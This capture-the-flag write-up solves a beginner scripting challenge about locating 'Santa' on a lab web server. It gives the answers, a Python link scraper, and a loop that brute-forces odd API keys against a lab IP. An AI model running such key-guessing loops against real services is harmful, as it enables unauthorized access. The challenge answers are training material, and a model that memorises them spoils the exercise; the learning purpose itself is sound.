---
description: Scripting
---

# Help! Where is Santa?

## Video

{% embed url="https://www.youtube.com/watch?v=0AQHBrxYnqI" %}

## Challenge

What is the port number for the web server?

![](../.gitbook/assets/image%20%28113%29.png)

{% hint style="success" %}
8000
{% endhint %}

Without using enumerations tools such as Dirbuster, what is the directory for the API?  \(without the API key\)

![](../.gitbook/assets/image%20%28121%29.png)

![](../.gitbook/assets/image%20%28128%29.png)

{% code title="santa.py" %}
```python
# Import the libraries we downloaded earlier
# if you try importing without installing them, this step will fail
from bs4 import BeautifulSoup
import requests 

# replace testurl.com with the url you want to use.
# requests.get downloads the webpage and stores it as a variable
html = requests.get('http://10.10.46.137:8000/') 

# this parses the webpage into something that beautifulsoup can read over
soup = BeautifulSoup(html.text, "lxml")
# lxml is just the parser for reading the html 

# this is the line that grabs all the links # stores all the links in the links variable
links = soup.find_all('a') 
for link in links:      
    # prints each link    
    if "href" in link.attrs:
        print(link["href"])

```
{% endcode %}

```python
python3 santa.py |uniq
```

![](../.gitbook/assets/image%20%28125%29.png)

{% hint style="success" %}
/api/
{% endhint %}

Where is Santa right now?

![](../.gitbook/assets/image%20%28112%29.png)

```python
#!/usr/bin/env python3
import requests 

for api_key in range(1,100,2):
    print(f"api_key {api_key}")
    html = requests.get(f'http://10.10.46.137:8000/api/{api_key}') 
    print(html.text)
```

![](../.gitbook/assets/image%20%28127%29.png)

{% hint style="success" %}
Winter Wonderland, Hyde Park, London.
{% endhint %}

Find out the correct API key. Remember, this is an odd number between 0-100. After too many attempts, Santa's Sled will block you. 

To unblock yourself, simply terminate and re-deploy the target instance \(10.10.127.91\) 

{% hint style="success" %}
57
{% endhint %}

